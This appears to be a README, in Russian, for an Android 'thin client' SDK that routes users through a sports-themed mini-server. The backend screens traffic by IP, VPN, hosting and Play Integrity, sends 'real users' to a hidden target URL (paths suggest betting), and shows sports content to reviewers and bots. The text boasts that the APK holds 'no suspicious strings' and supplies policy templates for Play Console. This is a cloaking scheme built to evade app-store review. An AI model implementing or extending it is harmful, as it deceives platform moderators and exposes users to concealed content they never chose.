# SDK v3 — Тонкий клиент

Лёгкий Android-клиент для server-driven контент-маршрутизации. Один класс, один запрос, минимум кода в APK.

---

## Как работает

```
Приложение → мини-сервер (спортивный хаб) → бекенд → URL
```

1. Приложение делает один GET-запрос на мини-сервер
2. Мини-сервер спрашивает бекенд: какой контент показать?
3. Бекенд проверяет качество трафика (IP, VPN, hosting, Play Integrity)
4. Реальный пользователь → целевой URL
5. Бот/подозрительный → спортивный контент

В APK только домен мини-сервера. Никаких подозрительных строк.

## Файлы

```
android-sdk-v3/
├── AppClient.kt          ← Клиент (Play Integrity + Instance UUID + auth)
├── proguard-rules.pro    ← ProGuard правила
├── INTEGRATION.md        ← Инструкция интеграции для прогера
├── SERVER_SETUP.md       ← Настройка мини-серверов + промпты для Claude
├── PRIVACY_POLICY.html   ← Шаблон Privacy Policy
├── DATA_SAFETY.md        ← Инструкция Data Safety для Play Console
└── README.md             ← Этот файл
```

## Быстрый старт

```kotlin
// Application.kt
val client = AppClient(
    context = this,
    endpoint = "https://your-domain.com",
    path = "/your_path",
    authToken = "your_secret_token",
    enableIntegrity = !BuildConfig.DEBUG,
)

// При запуске
val url = client.resolve()
if (url.isNotEmpty()) {
    // Открыть через Chrome Custom Tabs
    customTabsLauncher.launch(context, url)
} else {
    // Показать нативный контент
    showOfflineContent()
}
```

## Параметры AppClient

| Параметр | Описание |
|---|---|
| `context` | Application context |
| `endpoint` | Домен мини-сервера |
| `path` | Путь (/football, /stake_matches, /sport_data) |
| `authToken` | Секретный токен (sid) |
| `enableIntegrity` | Play Integrity (true в release, false в debug) |

## Что передаётся серверу

```
https://domain.com/path?app_id=com.pkg&locale=it&app_version=1.0&instance_id=uuid&sid=token&integrity_token=XYZ
```

Всё стандартное — package name, язык, версия, UUID, PI токен. Ничего подозрительного.

## Документация

- **Прогеру** → `INTEGRATION.md` (SDK, WebView, push, offline, чеклист)
- **Девопсу** → `SERVER_SETUP.md` (серверы, Docker, middleware, промпты для Claude)
- **Менеджеру** → `DATA_SAFETY.md` + `PRIVACY_POLICY.html` (Play Console)
